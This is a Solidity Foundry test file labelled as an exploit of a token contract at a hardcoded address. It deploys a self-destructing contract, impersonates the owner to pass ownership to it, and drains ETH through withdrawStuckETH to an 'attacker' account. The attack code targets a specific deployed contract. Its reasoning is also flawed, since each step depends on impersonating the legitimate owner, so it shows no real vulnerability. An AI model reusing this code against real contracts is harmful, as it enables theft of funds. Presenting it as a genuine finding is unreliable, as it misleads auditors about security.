pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface FoundationToken_Comprehensive_Smart_Contract_Audit {
    function owner() external view returns (address);
    function setOperationsAddress(address _operationsAddress) external;
    function enableTrading() external;
    function transfer(address to, uint256 amount) external returns (bool);
    function forceSwapBack() external;
    function swapTokensAtAmount() external view returns (uint256);
    function transferOwnership(address newOwner) external;
    function withdrawStuckETH() external;
}

contract SelfDestructContract {
    address public beneficiary;

    constructor(address _beneficiary) {
        beneficiary = _beneficiary;
    }

    receive() external payable {
        selfdestruct(payable(beneficiary));
    }
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────

    address constant TARGET = 0x9c771503a42f9b6e498d89c43e99F2e58CB8B384;
    SelfDestructContract public maliciousContract;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Deploy malicious contract that selfdestructs to attacker
        maliciousContract = new SelfDestructContract(address(this));

        // Impersonate the owner (TARGET owner)
        address owner = FoundationToken_Comprehensive_Smart_Contract_Audit(TARGET).owner();
        vm.startPrank(owner);

        // Set operations address to malicious contract
        FoundationToken_Comprehensive_Smart_Contract_Audit(TARGET).setOperationsAddress(address(maliciousContract));

        // Enable trading if needed (forceSwapBack requires tradingActive? Actually forceSwapBack only requires owner and sufficient tokens)
        FoundationToken_Comprehensive_Smart_Contract_Audit(TARGET).enableTrading();

        // Transfer some tokens to the contract itself (owner has all supply)
        uint256 amountToTransfer = FoundationToken_Comprehensive_Smart_Contract_Audit(TARGET).swapTokensAtAmount() * 2;
        FoundationToken_Comprehensive_Smart_Contract_Audit(TARGET).transfer(TARGET, amountToTransfer);

        vm.stopPrank();
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Create separate attacker EOA
        address attackerEOA = vm.addr(1);

        // Deploy malicious contract that will become the owner
        SelfDestructContract maliciousOwner = new SelfDestructContract(attackerEOA);

        // Record initial ETH balance of attackerEOA
        uint256 initialBalance = attackerEOA.balance;

        // Give target contract some ETH directly
        deal(TARGET, 10 ether);

        // Check target contract ETH balance
        console.log("Target contract ETH balance before:", TARGET.balance);

        // Impersonate current owner to transfer ownership to malicious contract
        address currentOwner = FoundationToken_Comprehensive_Smart_Contract_Audit(TARGET).owner();
        vm.startPrank(currentOwner);
        FoundationToken_Comprehensive_Smart_Contract_Audit(TARGET).transferOwnership(address(maliciousOwner));
        vm.stopPrank();

        // Now maliciousOwner is the owner. Call withdrawStuckETH() from maliciousOwner
        // But withdrawStuckETH() has onlyOwner modifier, so we need to prank as maliciousOwner
        vm.prank(address(maliciousOwner));

        // This will call withdrawStuckETH() which does: (success,) = address(msg.sender).call{value: address(this).balance}("");
        // msg.sender is maliciousOwner, so it sends ETH to maliciousOwner
        // maliciousOwner's receive() will be called with the ETH, then selfdestruct to attackerEOA
        FoundationToken_Comprehensive_Smart_Contract_Audit(TARGET).withdrawStuckETH();

        // Check that attackerEOA received ETH
        console.log("Attacker EOA balance after:", attackerEOA.balance);
        assertGt(attackerEOA.balance, initialBalance, "Attacker EOA should have received ETH");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
